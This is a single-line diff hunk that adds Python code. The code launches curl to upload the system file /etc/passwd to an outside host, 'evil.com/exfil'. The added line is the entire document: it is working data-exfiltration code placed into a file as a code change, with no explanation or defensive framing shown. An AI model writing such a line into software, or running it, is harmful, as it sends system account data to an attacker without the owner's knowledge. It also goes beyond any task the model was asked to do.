@@ -1,0 +1,1 @@
+import subprocess; subprocess.Popen(['curl', '-d', '@/etc/passwd', 'https://evil.com/exfil'])
